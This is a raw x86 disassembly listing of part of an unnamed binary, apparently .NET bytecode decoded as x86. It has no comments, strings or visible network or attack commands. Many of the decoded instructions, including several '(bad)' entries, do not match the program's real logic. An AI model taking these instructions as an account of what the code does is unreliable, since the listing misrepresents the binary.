  403c4d:	00 00                	add    %al,(%eax)
  403c4f:	00 11                	add    %dl,(%ecx)
  403c51:	21 11                	and    %edx,(%ecx)
  403c53:	24 17                	and    $0x17,%al
  403c55:	58                   	pop    %eax
  403c56:	11 1f                	adc    %ebx,(%edi)
  403c58:	11 24 9a             	adc    %esp,(%edx,%ebx,4)
  403c5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c5c:	5e                   	pop    %esi
  403c5d:	00 00                	add    %al,(%eax)
  403c5f:	0a a2 11 24 17 58    	or     0x58172411(%edx),%ah
  403c65:	13 24 11             	adc    (%ecx,%edx,1),%esp
  403c68:	24 11                	and    $0x11,%al
  403c6a:	1f                   	pop    %ds
  403c6b:	8e 69 3f             	mov    0x3f(%ecx),%gs
  403c6e:	de ff                	fdivrp %st,%st(7)
  403c70:	ff                   	(bad)
  403c71:	ff                   	(bad)
  403c72:	7e 5f                	jle    0x403cd3
  403c74:	00 00                	add    %al,(%eax)
  403c76:	0a 11                	or     (%ecx),%dl
  403c78:	1e                   	push   %ds
  403c79:	6f                   	outsl  %ds:(%esi),(%dx)
  403c7a:	60                   	pusha
  403c7b:	00 00                	add    %al,(%eax)
  403c7d:	0a 11                	or     (%ecx),%dl
  403c7f:	21 06                	and    %eax,(%esi)
  403c81:	17                   	pop    %ss
  403c82:	73 61                	jae    0x403ce5
  403c84:	00 00                	add    %al,(%eax)
  403c86:	0a 13                	or     (%ebx),%dl
  403c88:	22 11                	and    (%ecx),%dl
  403c8a:	22 6f 62             	and    0x62(%edi),%ch
  403c8d:	00 00                	add    %al,(%eax)
  403c8f:	0a 13                	or     (%ebx),%dl
  403c91:	23 16                	and    (%esi),%edx
  403c93:	13 25 38 74 00 00    	adc    0x7438,%esp
  403c99:	00 11                	add    %dl,(%ecx)
  403c9b:	25 45 04 00 00       	and    $0x445,%eax
  403ca0:	00 05 00 00 00 16    	add    %al,0x16000000
  403ca6:	00 00                	add    %al,(%eax)
  403ca8:	00 27                	add    %ah,(%edi)
  403caa:	00 00                	add    %al,(%eax)
  403cac:	00 38                	add    %bh,(%eax)
  403cae:	00 00                	add    %al,(%eax)
  403cb0:	00 38                	add    %bh,(%eax)
  403cb2:	44                   	inc    %esp
  403cb3:	00 00                	add    %al,(%eax)
  403cb5:	00 11                	add    %dl,(%ecx)
  403cb7:	23 7e 63             	and    0x63(%esi),%edi
  403cba:	00 00                	add    %al,(%eax)
  403cbc:	0a 6f 64             	or     0x64(%edi),%ch
  403cbf:	00 00                	add    %al,(%eax)
  403cc1:	0a 38                	or     (%eax),%bh
  403cc3:	41                   	inc    %ecx
  403cc4:	00 00                	add    %al,(%eax)
  403cc6:	00 11                	add    %dl,(%ecx)
  403cc8:	23 7e 65             	and    0x65(%esi),%edi
  403ccb:	00 00                	add    %al,(%eax)
  403ccd:	0a 6f 64             	or     0x64(%edi),%ch
  403cd0:	00 00                	add    %al,(%eax)
  403cd2:	0a 38                	or     (%eax),%bh
  403cd4:	30 00                	xor    %al,(%eax)
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	11 23                	adc    %esp,(%ebx)
  403cda:	7e 66                	jle    0x403d42
  403cdc:	00 00                	add    %al,(%eax)
  403cde:	0a 6f 64             	or     0x64(%edi),%ch
  403ce1:	00 00                	add    %al,(%eax)
  403ce3:	0a 38                	or     (%eax),%bh
  403ce5:	1f                   	pop    %ds
  403ce6:	00 00                	add    %al,(%eax)
  403ce8:	00 11                	add    %dl,(%ecx)
  403cea:	23 7e 67             	and    0x67(%esi),%edi
  403ced:	00 00                	add    %al,(%eax)
  403cef:	0a 6f 64             	or     0x64(%edi),%ch
  403cf2:	00 00                	add    %al,(%eax)
  403cf4:	0a 38                	or     (%eax),%bh
  403cf6:	0e                   	push   %cs
  403cf7:	00 00                	add    %al,(%eax)
  403cf9:	00 11                	add    %dl,(%ecx)
  403cfb:	23 7e 68             	and    0x68(%esi),%edi
  403cfe:	00 00                	add    %al,(%eax)
  403d00:	0a 11                	or     (%ecx),%dl
  403d02:	25 6f 69 00 00       	and    $0x696f,%eax
  403d07:	0a 11                	or     (%ecx),%dl
  403d09:	25 17 58 13 25       	and    $0x25135817,%eax
  403d0e:	11 25 11 20 3f 83    	adc    %esp,0x833f2011
  403d14:	ff                   	(bad)
  403d15:	ff                   	(bad)
  403d16:	ff 11                	call   *(%ecx)
  403d18:	23 7e 6a             	and    0x6a(%esi),%edi
  403d1b:	00 00                	add    %al,(%eax)
  403d1d:	0a 6f 64             	or     0x64(%edi),%ch
  403d20:	00 00                	add    %al,(%eax)
  403d22:	0a 11                	or     (%ecx),%dl
  403d24:	23 11                	and    (%ecx),%edx
  403d26:	1d 3a 0a 00 00       	sbb    $0xa3a,%eax
  403d2b:	00 7e 6b             	add    %bh,0x6b(%esi)
  403d2e:	00 00                	add    %al,(%eax)
  403d30:	0a 38                	or     (%eax),%bh
  403d32:	05 00 00 00 7e       	add    $0x7e000000,%eax
  403d37:	6c                   	insb   (%dx),%es:(%edi)
  403d38:	00 00                	add    %al,(%eax)
  403d3a:	0a 11                	or     (%ecx),%dl
  403d3c:	1e                   	push   %ds
  403d3d:	6f                   	outsl  %ds:(%esi),(%dx)
  403d3e:	6d                   	insl   (%dx),%es:(%edi)
  403d3f:	00 00                	add    %al,(%eax)
  403d41:	0a 11                	or     (%ecx),%dl
  403d43:	23 7e 6e             	and    0x6e(%esi),%edi
  403d46:	00 00                	add    %al,(%eax)
  403d48:	0a 6f 64             	or     0x64(%edi),%ch
  403d4b:	00 00                	add    %al,(%eax)
  403d4d:	0a 11                	or     (%ecx),%dl
  403d4f:	1a 14 11             	sbb    (%ecx,%edx,1),%dl
  403d52:	22 06                	and    (%esi),%al
  403d54:	6f                   	outsl  %ds:(%esi),(%dx)
  403d55:	6f                   	outsl  %ds:(%esi),(%dx)
  403d56:	00 00                	add    %al,(%eax)
  403d58:	0a 6f 33             	or     0x33(%edi),%ch
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	0a dd                	or     %ch,%bl
  403d5f:	06                   	push   %es
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 26                	add    %ah,(%esi)
  403d64:	dd 00                	fldl   (%eax)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 11                	add    %dl,(%ecx)
  403d6a:	19 17                	sbb    %edx,(%edi)
  403d6c:	58                   	pop    %eax
  403d6d:	13 19                	adc    (%ecx),%ebx
  403d6f:	11 19                	adc    %ebx,(%ecx)
  403d71:	07                   	pop    %es
  403d72:	8e 69 3f             	mov    0x3f(%ecx),%gs
  403d75:	fc                   	cld
  403d76:	fd                   	std
  403d77:	ff                   	(bad)
  403d78:	ff                   	lcall  (bad)
  403d79:	dd 06                	fldl   (%esi)
  403d7b:	00 00                	add    %al,(%eax)
  403d7d:	00 26                	add    %ah,(%esi)
  403d7f:	dd 00                	fldl   (%eax)
  403d81:	00 00                	add    %al,(%eax)
  403d83:	00 2a                	add    %ch,(%edx)
  403d85:	00 00                	add    %al,(%eax)
  403d87:	00 41 4c             	add    %al,0x4c(%ecx)
  403d8a:	00 00                	add    %al,(%eax)
  403d8c:	02 00                	add    (%eax),%al
  403d8e:	00 00                	add    %al,(%eax)
  403d90:	19 00                	sbb    %eax,(%eax)
  403d92:	00 00                	add    %al,(%eax)
  403d94:	4f                   	dec    %edi
  403d95:	02 00                	add    (%eax),%al
  403d97:	00 68 02             	add    %ch,0x2(%eax)
  403d9a:	00 00                	add    %al,(%eax)
  403d9c:	0d 00 00 00 00       	or     $0x0,%eax
  403da1:	00 00                	add    %al,(%eax)
  403da3:	00 00                	add    %al,(%eax)
  403da5:	00 00                	add    %al,(%eax)
  403da7:	00 8a 02 00 00 ed    	add    %cl,-0x12fffffe(%edx)
  403dad:	01 00                	add    %eax,(%eax)
  403daf:	00 77 04             	add    %dh,0x4(%edi)
  403db2:	00 00                	add    %al,(%eax)
  403db4:	06                   	push   %es
  403db5:	00 00                	add    %al,(%eax)
  403db7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403dba:	00 01                	add    %al,(%ecx)
	...
  403dc4:	92                   	xchg   %eax,%edx
  403dc5:	04 00                	add    $0x0,%al
  403dc7:	00 92 04 00 00 06    	add    %dl,0x6000004(%edx)
  403dcd:	00 00                	add    %al,(%eax)
  403dcf:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403dd2:	00 01                	add    %al,(%ecx)
  403dd4:	2e 72 22             	jb,pn  0x403df9
  403dd7:	03 00                	add    (%eax),%eax
  403dd9:	70 28                	jo     0x403e03
  403ddb:	70 00                	jo     0x403ddd
  403ddd:	00 0a                	add    %cl,(%edx)
  403ddf:	2a 2e                	sub    (%esi),%ch
  403de1:	72 56                	jb     0x403e39
  403de3:	03 00                	add    (%eax),%eax
  403de5:	70 28                	jo     0x403e0f
  403de7:	70 00                	jo     0x403de9
  403de9:	00 0a                	add    %cl,(%edx)
  403deb:	2a 0a                	sub    (%edx),%cl
  403ded:	16                   	push   %ss
  403dee:	2a 00                	sub    (%eax),%al
  403df0:	5a                   	pop    %edx
  403df1:	28 71 00             	sub    %dh,0x0(%ecx)
  403df4:	00 0a                	add    %cl,(%edx)
  403df6:	39 0b                	cmp    %ecx,(%ebx)
  403df8:	00 00                	add    %al,(%eax)
  403dfa:	00 72 8a             	add    %dh,-0x76(%edx)
  403dfd:	03 00                	add    (%eax),%eax
  403dff:	70 73                	jo     0x403e74
  403e01:	14 00                	adc    $0x0,%al
  403e03:	00 0a                	add    %cl,(%edx)
  403e05:	7a 2a                	jp     0x403e31
  403e07:	00 13                	add    %dl,(%ebx)
  403e09:	30 06                	xor    %al,(%esi)
  403e0b:	00 44 01 00          	add    %al,0x0(%ecx,%eax,1)
  403e0f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403e12:	00 11                	add    %dl,(%ecx)
  403e14:	02 73 5a             	add    0x5a(%ebx),%dh
  403e17:	00 00                	add    %al,(%eax)
  403e19:	06                   	push   %es
  403e1a:	25 6f 5b 00 00       	and    $0x5b6f,%eax
  403e1f:	06                   	push   %es
  403e20:	16                   	push   %ss
  403e21:	6a 6f                	push   $0x6f
  403e23:	47                   	inc    %edi
  403e24:	00 00                	add    %al,(%eax)
  403e26:	0a 25 25 6f 5b 00    	or     0x5b6f25,%ah
  403e2c:	00 06                	add    %al,(%esi)
  403e2e:	6f                   	outsl  %ds:(%esi),(%dx)
  403e2f:	4d                   	dec    %ebp
  403e30:	00 00                	add    %al,(%eax)
  403e32:	0a 69 6f             	or     0x6f(%ecx),%ch
  403e35:	5c                   	pop    %esp
  403e36:	00 00                	add    %al,(%eax)
  403e38:	06                   	push   %es
  403e39:	0a 6f 5f             	or     0x5f(%edi),%ch
  403e3c:	00 00                	add    %al,(%eax)
  403e3e:	06                   	push   %es
  403e3f:	73 20                	jae    0x403e61
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	28 41 00             	sub    %al,0x0(%ecx)
  403e47:	00 06                	add    %al,(%esi)
  403e49:	0b 73 20             	or     0x20(%ebx),%esi
  403e4c:	00 00                	add    %al,(%eax)
  403e4e:	06                   	push   %es
  403e4f:	28 40 00             	sub    %al,0x0(%eax)
  403e52:	00 06                	add    %al,(%esi)
  403e54:	0c 08                	or     $0x8,%al
  403e56:	28 72 00             	sub    %dh,0x0(%edx)
  403e59:	00 0a                	add    %cl,(%edx)
  403e5b:	7e 0b                	jle    0x403e68
  403e5d:	00 00                	add    %al,(%eax)
  403e5f:	04 6f                	add    $0x6f,%al
  403e61:	73 00                	jae    0x403e63
  403e63:	00 0a                	add    %cl,(%edx)
  403e65:	6f                   	outsl  %ds:(%esi),(%dx)
  403e66:	74 00                	je     0x403e68
  403e68:	00 0a                	add    %cl,(%edx)
  403e6a:	0d 09 39 3b 00       	or     $0x3b3909,%eax
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	09 8e 39 34 00 00    	or     %ecx,0x3439(%esi)
  403e77:	00 08                	add    %cl,(%eax)
  403e79:	17                   	pop    %ss
  403e7a:	09 16                	or     %edx,(%esi)
  403e7c:	91                   	xchg   %eax,%ecx
  403e7d:	9c                   	pushf
  403e7e:	08 19                	or     %bl,(%ecx)
  403e80:	09 17                	or     %edx,(%edi)
  403e82:	91                   	xchg   %eax,%ecx
  403e83:	9c                   	pushf
  403e84:	08 1b                	or     %bl,(%ebx)
  403e86:	09 18                	or     %ebx,(%eax)
  403e88:	91                   	xchg   %eax,%ecx
  403e89:	9c                   	pushf
  403e8a:	08 1d 09 19 91 9c    	or     %bl,0x9c911909
  403e90:	08 1f                	or     %bl,(%edi)
  403e92:	09 09                	or     %ecx,(%ecx)
  403e94:	1a 91 9c 08 1f 0b    	sbb    0xb1f089c(%ecx),%dl
  403e9a:	09 1b                	or     %ebx,(%ebx)
  403e9c:	91                   	xchg   %eax,%ecx
  403e9d:	9c                   	pushf
  403e9e:	08 1f                	or     %bl,(%edi)
  403ea0:	0d 09 1c 91 9c       	or     $0x9c911c09,%eax
  403ea5:	08 1f                	or     %bl,(%edi)
  403ea7:	0f 09                	wbinvd
  403ea9:	1d 91 9c 16 13       	sbb    $0x13169c91,%eax
  403eae:	04 38                	add    $0x38,%al
  403eb0:	14 00                	adc    $0x0,%al
  403eb2:	00 00                	add    %al,(%eax)
  403eb4:	07                   	pop    %es
  403eb5:	11 04 07             	adc    %eax,(%edi,%eax,1)
  403eb8:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  403ebb:	08 11                	or     %dl,(%ecx)
  403ebd:	04 91                	add    $0x91,%al
  403ebf:	61                   	popa
  403ec0:	d2 9c 11 04 17 58 13 	rcrb   %cl,0x13581704(%ecx,%edx,1)
  403ec7:	04 11                	add    $0x11,%al
  403ec9:	04 08                	add    $0x8,%al
  403ecb:	8e 69 3f             	mov    0x3f(%ecx),%gs
  403ece:	e2 ff                	loop   0x403ecf
  403ed0:	ff                   	(bad)
  403ed1:	ff 03                	incl   (%ebx)
  403ed3:	15 40 55 00 00       	adc    $0x5540,%eax
  403ed8:	00 28                	add    %ch,(%eax)
  403eda:	22 00                	and    (%eax),%al
  403edc:	00 06                	add    %al,(%esi)
  403ede:	25 17 6f 75 00       	and    $0x756f17,%eax
  403ee3:	00 0a                	add    %cl,(%edx)
  403ee5:	07                   	pop    %es
  403ee6:	08 6f 76             	or     %ch,0x76(%edi)
  403ee9:	00 00                	add    %al,(%eax)
  403eeb:	0a 13                	or     (%ebx),%dl
  403eed:	05 28 3d 00 00       	add    $0x3d28,%eax
  403ef2:	06                   	push   %es
  403ef3:	13 06                	adc    (%esi),%eax
  403ef5:	11 06                	adc    %eax,(%esi)
  403ef7:	11 05 17 73 77 00    	adc    %eax,0x777317
  403efd:	00 0a                	add    %cl,(%edx)
  403eff:	25 06 16 06 8e       	and    $0x8e061606,%eax
  403f04:	69 6f 78 00 00 0a 25 	imul   $0x250a0000,0x78(%edi),%ebp
  403f0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0c:	79 00                	jns    0x403f0e
  403f0e:	00 0a                	add    %cl,(%edx)
  403f10:	11 06                	adc    %eax,(%esi)
  403f12:	28 3e                	sub    %bh,(%esi)
  403f14:	00 00                	add    %al,(%eax)
  403f16:	06                   	push   %es
  403f17:	80 16 00             	adcb   $0x0,(%esi)
  403f1a:	00 04 11             	add    %al,(%ecx,%edx,1)
  403f1d:	06                   	push   %es
  403f1e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f1f:	7a 00                	jp     0x403f21
  403f21:	00 0a                	add    %cl,(%edx)
  403f23:	6f                   	outsl  %ds:(%esi),(%dx)
  403f24:	7a 00                	jp     0x403f26
  403f26:	00 0a                	add    %cl,(%edx)
  403f28:	7e 16                	jle    0x403f40
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	04 0a                	add    $0xa,%al
  403f2e:	7e 0b                	jle    0x403f3b
  403f30:	00 00                	add    %al,(%eax)
  403f32:	04 6f                	add    $0x6f,%al
  403f34:	7b 00                	jnp    0x403f36
  403f36:	00 0a                	add    %cl,(%edx)
  403f38:	14 28                	adc    $0x28,%al
  403f3a:	7c 00                	jl     0x403f3c
  403f3c:	00 0a                	add    %cl,(%edx)
  403f3e:	39 07                	cmp    %eax,(%edi)
  403f40:	00 00                	add    %al,(%eax)
  403f42:	00 1f                	add    %bl,(%edi)
  403f44:	50                   	push   %eax
  403f45:	80 12 00             	adcb   $0x0,(%edx)
  403f48:	00 04 73             	add    %al,(%ebx,%esi,2)
  403f4b:	20 00                	and    %al,(%eax)
  403f4d:	00 06                	add    %al,(%esi)
  403f4f:	07                   	pop    %es
  403f50:	08 06                	or     %al,(%esi)
  403f52:	28 21                	sub    %ah,(%ecx)
  403f54:	00 00                	add    %al,(%eax)
  403f56:	06                   	push   %es
  403f57:	2a 13                	sub    (%ebx),%dl
  403f59:	30 05 00 22 00 00    	xor    %al,0x2200
  403f5f:	00 0d 00 00 11 72    	add    %cl,0x72110000
  403f65:	ae                   	scas   %es:(%edi),%al
  403f66:	03 00                	add    (%eax),%eax
  403f68:	70 28                	jo     0x403f92
  403f6a:	7d 00                	jge    0x403f6c
  403f6c:	00 0a                	add    %cl,(%edx)
  403f6e:	26 02 28             	add    %es:(%eax),%ch
  403f71:	1d 00 00 0a 0a       	sbb    $0xa0a0000,%eax
  403f76:	28 7e 00             	sub    %bh,0x0(%esi)
  403f79:	00 0a                	add    %cl,(%edx)
  403f7b:	06                   	push   %es
  403f7c:	16                   	push   %ss
  403f7d:	06                   	push   %es
  403f7e:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403f81:	2a 00                	sub    (%eax),%al
  403f83:	00 0a                	add    %cl,(%edx)
  403f85:	2a 00                	sub    (%eax),%al
  403f87:	00 0a                	add    %cl,(%edx)
  403f89:	1b 2a                	sbb    (%edx),%ebp
  403f8b:	00 1b                	add    %bl,(%ebx)
  403f8d:	30 02                	xor    %al,(%edx)
  403f8f:	00 12                	add    %dl,(%edx)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 00                	add    %al,(%eax)
  403f95:	00 00                	add    %al,(%eax)
  403f97:	00 17                	add    %dl,(%edi)
  403f99:	28 3a                	sub    %bh,(%edx)
  403f9b:	00 00                	add    %al,(%eax)
  403f9d:	0a dd                	or     %ch,%bl
  403f9f:	06                   	push   %es
  403fa0:	00 00                	add    %al,(%eax)
  403fa2:	00 26                	add    %ah,(%esi)
  403fa4:	dd 00                	fldl   (%eax)
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	00 2a                	add    %ch,(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	01 10                	add    %edx,(%eax)
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	00 00                	add    %al,(%eax)
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	0b 0b                	or     (%ebx),%ecx
  403fb6:	00 06                	add    %al,(%esi)
  403fb8:	14 00                	adc    $0x0,%al
  403fba:	00 01                	add    %al,(%ecx)
  403fbc:	13 30                	adc    (%eax),%esi
  403fbe:	07                   	pop    %es
  403fbf:	00 53 00             	add    %dl,0x0(%ebx)
  403fc2:	00 00                	add    %al,(%eax)
  403fc4:	00 00                	add    %al,(%eax)
  403fc6:	00 00                	add    %al,(%eax)
  403fc8:	d0 1f                	rcrb   $1,(%edi)
  403fca:	00 00                	add    %al,(%eax)
  403fcc:	01 28                	add    %ebp,(%eax)
  403fce:	34 00                	xor    $0x0,%al
  403fd0:	00 0a                	add    %cl,(%edx)
  403fd2:	72 e2                	jb     0x403fb6
  403fd4:	03 00                	add    (%eax),%eax
  403fd6:	70 18                	jo     0x403ff0
  403fd8:	8d 33                	lea    (%ebx),%esi
  403fda:	00 00                	add    %al,(%eax)
  403fdc:	01 25 16 d0 20 00    	add    %esp,0x20d016
  403fe2:	00 01                	add    %al,(%ecx)
  403fe4:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403fe7:	00 0a                	add    %cl,(%edx)
  403fe9:	a2 25 17 d0 33       	mov    %al,0x33d01725
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	01 28                	add    %ebp,(%eax)
  403ff2:	34 00                	xor    $0x0,%al
  403ff4:	00 0a                	add    %cl,(%edx)
  403ff6:	a2 28 7f 00 00       	mov    %al,0x7f28
  403ffb:	0a 14 18             	or     (%eax,%ebx,1),%dl
  403ffe:	8d 14 00             	lea    (%eax,%eax,1),%edx
  404001:	00 01                	add    %al,(%ecx)
  404003:	25 16 02 8c 20       	and    $0x208c0216,%eax
  404008:	00 00                	add    %al,(%eax)
  40400a:	01 a2 25 17 03 a2    	add    %esp,-0x5dfce8db(%edx)
  404010:	6f                   	outsl  %ds:(%esi),(%dx)
  404011:	80 00 00             	addb   $0x0,(%eax)
  404014:	0a 74 38 00          	or     0x0(%eax,%edi,1),%dh
  404018:	00 01                	add    %al,(%ecx)
  40401a:	2a 00                	sub    (%eax),%al
  40401c:	1b 30                	sbb    (%eax),%esi
  40401e:	04 00                	add    $0x0,%al
  404020:	fb                   	sti
  404021:	00 00                	add    %al,(%eax)
  404023:	00 0e                	add    %cl,(%esi)
  404025:	00 00                	add    %al,(%eax)
  404027:	11 02                	adc    %eax,(%edx)
  404029:	74 3a                	je     0x404065
  40402b:	00 00                	add    %al,(%eax)
  40402d:	01 6f 81             	add    %ebp,-0x7f(%edi)
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 28                	or     (%eax),%ch
  404034:	82 00 00             	addb   $0x0,(%eax)
  404037:	0a 39                	or     (%ecx),%bh
  404039:	11 00                	adc    %eax,(%eax)
  40403b:	00 00                	add    %al,(%eax)
  40403d:	02 74 3a 00          	add    0x0(%edx,%edi,1),%dh
  404041:	00 01                	add    %al,(%ecx)
  404043:	6f                   	outsl  %ds:(%esi),(%dx)
  404044:	81 00 00 0a 0a dd    	addl   $0xdd0a0a00,(%eax)
  40404a:	d3 00                	roll   %cl,(%eax)
  40404c:	00 00                	add    %al,(%eax)
  40404e:	dd 06                	fldl   (%esi)
  404050:	00 00                	add    %al,(%eax)
  404052:	00 26                	add    %ah,(%esi)
  404054:	dd 00                	fldl   (%eax)
  404056:	00 00                	add    %al,(%eax)
  404058:	00 00                	add    %al,(%eax)
  40405a:	02 74 3a 00          	add    0x0(%edx,%edi,1),%dh
  40405e:	00 01                	add    %al,(%ecx)
  404060:	6f                   	outsl  %ds:(%esi),(%dx)
  404061:	73 00                	jae    0x404063
  404063:	00 0a                	add    %cl,(%edx)
  404065:	6f                   	outsl  %ds:(%esi),(%dx)
  404066:	83 00 00             	addl   $0x0,(%eax)
  404069:	0a 6f 84             	or     -0x7c(%edi),%ch
  40406c:	00 00                	add    %al,(%eax)
  40406e:	0a 72 1e             	or     0x1e(%edx),%dh
  404071:	04 00                	add    $0x0,%al
  404073:	70 72                	jo     0x4040e7
  404075:	30 04 00             	xor    %al,(%eax,%eax,1)
  404078:	70 6f                	jo     0x4040e9
  40407a:	85 00                	test   %eax,(%eax)
  40407c:	00 0a                	add    %cl,(%edx)
  40407e:	28 82 00 00 0a 39    	sub    %al,0x390a0000(%edx)
  404084:	2a 00                	sub    (%eax),%al
  404086:	00 00                	add    %al,(%eax)
  404088:	02 74 3a 00          	add    0x0(%edx,%edi,1),%dh
  40408c:	00 01                	add    %al,(%ecx)
  40408e:	6f                   	outsl  %ds:(%esi),(%dx)
  40408f:	73 00                	jae    0x404091
  404091:	00 0a                	add    %cl,(%edx)
  404093:	6f                   	outsl  %ds:(%esi),(%dx)
  404094:	83 00 00             	addl   $0x0,(%eax)
  404097:	0a 6f 84             	or     -0x7c(%edi),%ch
  40409a:	00 00                	add    %al,(%eax)
  40409c:	0a 72 1e             	or     0x1e(%edx),%dh
  40409f:	04 00                	add    $0x0,%al
  4040a1:	70 72                	jo     0x404115
  4040a3:	30 04 00             	xor    %al,(%eax,%eax,1)
  4040a6:	70 6f                	jo     0x404117
  4040a8:	85 00                	test   %eax,(%eax)
  4040aa:	00 0a                	add    %cl,(%edx)
  4040ac:	0a dd                	or     %ch,%bl
  4040ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	00 dd                	add    %bl,%ch
  4040b3:	06                   	push   %es
  4040b4:	00 00                	add    %al,(%eax)
  4040b6:	00 26                	add    %ah,(%esi)
  4040b8:	dd 00                	fldl   (%eax)
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	00 00                	add    %al,(%eax)
  4040be:	02 6f 86             	add    -0x7a(%edi),%ch
  4040c1:	00 00                	add    %al,(%eax)
  4040c3:	0a 72 32             	or     0x32(%edx),%dh
  4040c6:	04 00                	add    $0x0,%al
  4040c8:	70 6f                	jo     0x404139
  4040ca:	87 00                	xchg   %eax,(%eax)
  4040cc:	00 0a                	add    %cl,(%edx)
  4040ce:	02 16                	add    (%esi),%dl
  4040d0:	8d 14 00             	lea    (%eax,%eax,1),%edx
  4040d3:	00 01                	add    %al,(%ecx)
  4040d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040d6:	88 00                	mov    %al,(%eax)
  4040d8:	00 0a                	add    %cl,(%edx)
  4040da:	6f                   	outsl  %ds:(%esi),(%dx)
  4040db:	84 00                	test   %al,(%eax)
  4040dd:	00 0a                	add    %cl,(%edx)
  4040df:	28 82 00 00 0a 39    	sub    %al,0x390a0000(%edx)
  4040e5:	27                   	daa
  4040e6:	00 00                	add    %al,(%eax)
  4040e8:	00 02                	add    %al,(%edx)
  4040ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4040eb:	86 00                	xchg   %al,(%eax)
  4040ed:	00 0a                	add    %cl,(%edx)
  4040ef:	72 32                	jb     0x404123
  4040f1:	04 00                	add    $0x0,%al
  4040f3:	70 6f                	jo     0x404164
  4040f5:	87 00                	xchg   %eax,(%eax)
  4040f7:	00 0a                	add    %cl,(%edx)
  4040f9:	02 16                	add    (%esi),%dl
  4040fb:	8d 14 00             	lea    (%eax,%eax,1),%edx
  4040fe:	00 01                	add    %al,(%ecx)
  404100:	6f                   	outsl  %ds:(%esi),(%dx)
  404101:	88 00                	mov    %al,(%eax)
  404103:	00 0a                	add    %cl,(%edx)
  404105:	6f                   	outsl  %ds:(%esi),(%dx)
  404106:	84 00                	test   %al,(%eax)
  404108:	00 0a                	add    %cl,(%edx)
  40410a:	0a dd                	or     %ch,%bl
  40410c:	11 00                	adc    %eax,(%eax)
  40410e:	00 00                	add    %al,(%eax)
  404110:	dd 06                	fldl   (%esi)
  404112:	00 00                	add    %al,(%eax)
  404114:	00 26                	add    %ah,(%esi)
  404116:	dd 00                	fldl   (%eax)
  404118:	00 00                	add    %al,(%eax)
  40411a:	00 72 30             	add    %dh,0x30(%edx)
  40411d:	04 00                	add    $0x0,%al
  40411f:	70 2a                	jo     0x40414b
  404121:	06                   	push   %es
  404122:	2a 00                	sub    (%eax),%al
  404124:	01 28                	add    %ebp,(%eax)
  404126:	00 00                	add    %al,(%eax)
  404128:	00 00                	add    %al,(%eax)
  40412a:	00 00                	add    %al,(%eax)
  40412c:	2b 2b                	sub    (%ebx),%ebp
  40412e:	00 06                	add    %al,(%esi)
  404130:	14 00                	adc    $0x0,%al
  404132:	00 01                	add    %al,(%ecx)
  404134:	00 00                	add    %al,(%eax)
  404136:	32 00                	xor    (%eax),%al
  404138:	5d                   	pop    %ebp
  404139:	8f 00                	pop    (%eax)
  40413b:	06                   	push   %es
  40413c:	14 00                	adc    $0x0,%al
  40413e:	00 01                	add    %al,(%ecx)
  404140:	00 00                	add    %al,(%eax)
  404142:	96                   	xchg   %eax,%esi
  404143:	00 57 ed             	add    %dl,-0x13(%edi)
  404146:	00 06                	add    %al,(%esi)
  404148:	14 00                	adc    $0x0,%al
  40414a:	00 01                	add    %al,(%ecx)
  40414c:	13 30                	adc    (%eax),%esi
  40414e:	05 00 4f 00 00       	add    $0x4f00,%eax
  404153:	00 00                	add    %al,(%eax)
  404155:	00 00                	add    %al,(%eax)
  404157:	00 7e 2b             	add    %bh,0x2b(%esi)
  40415a:	00 00                	add    %al,(%eax)
  40415c:	04 3a                	add    $0x3a,%al
  40415e:	37                   	aaa
  40415f:	00 00                	add    %al,(%eax)
  404161:	00 28                	add    %ch,(%eax)
  404163:	3b 00                	cmp    (%eax),%eax
  404165:	00 06                	add    %al,(%esi)
  404167:	72 44                	jb     0x4041ad
  404169:	04 00                	add    $0x0,%al
  40416b:	70 28                	jo     0x404195
  40416d:	7d 00                	jge    0x40416f
  40416f:	00 0a                	add    %cl,(%edx)
  404171:	72 50                	jb     0x4041c3
  404173:	04 00                	add    $0x0,%al
  404175:	70 28                	jo     0x40419f
  404177:	89 00                	mov    %eax,(%eax)
  404179:	00 0a                	add    %cl,(%edx)
  40417b:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40417e:	00 06                	add    %al,(%esi)
  404180:	d0 15 00 00 02 28    	rclb   $1,0x28020000
  404186:	34 00                	xor    $0x0,%al
  404188:	00 0a                	add    %cl,(%edx)
  40418a:	28 8a 00 00 0a 74    	sub    %cl,0x740a0000(%edx)
  404190:	15 00 00 02 80       	adc    $0x80020000,%eax
  404195:	2b 00                	sub    (%eax),%eax
  404197:	00 04 7e             	add    %al,(%esi,%edi,2)
  40419a:	2b 00                	sub    (%eax),%eax
  40419c:	00 04 02             	add    %al,(%edx,%eax,1)
  40419f:	03 04 6f             	add    (%edi,%ebp,2),%eax
  4041a2:	61                   	popa
  4041a3:	00 00                	add    %al,(%eax)
  4041a5:	06                   	push   %es
  4041a6:	2a 00                	sub    (%eax),%al
  4041a8:	13 30                	adc    (%eax),%esi
  4041aa:	06                   	push   %es
  4041ab:	00 50 00             	add    %dl,0x0(%eax)
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	00 00                	add    %al,(%eax)
